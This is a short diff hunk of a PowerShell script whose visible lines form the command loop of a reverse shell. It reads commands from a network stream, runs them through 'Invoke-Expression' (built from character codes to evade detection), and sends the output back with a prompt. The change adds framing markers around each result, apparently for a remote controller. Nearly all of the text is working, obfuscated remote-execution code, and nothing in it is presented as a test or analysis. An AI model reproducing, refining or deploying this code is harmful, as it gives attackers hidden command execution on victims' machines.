@@ -7,7 +7,7 @@ while(($i=$s.Read($b,0,$b.Length)) -ne 0){
   $d=(New-Object $e).GetString($b,0,$i);
   $x=[string]::Concat([char]73,[char]110,[char]118,[char]111,[char]107,[char]101,[char]45,[char]69,[char]120,[char]112,[char]114,[char]101,[char]115,[char]115,[char]105,[char]111,[char]110);
   $r=(& (Get-Command $x) $d 2>&1|Out-String);
-  $r2=$r+'PS '+(pwd).Path+'> ';
+  $r2='@@HB'+$rid+'S@@'+$r+'@@HB'+$rid+'E@@'+'PS '+(pwd).Path+'> ';
   $z=[Text.Encoding]::ASCII.GetBytes($r2);
   $s.Write($z,0,$z.Length);$s.Flush()
 };
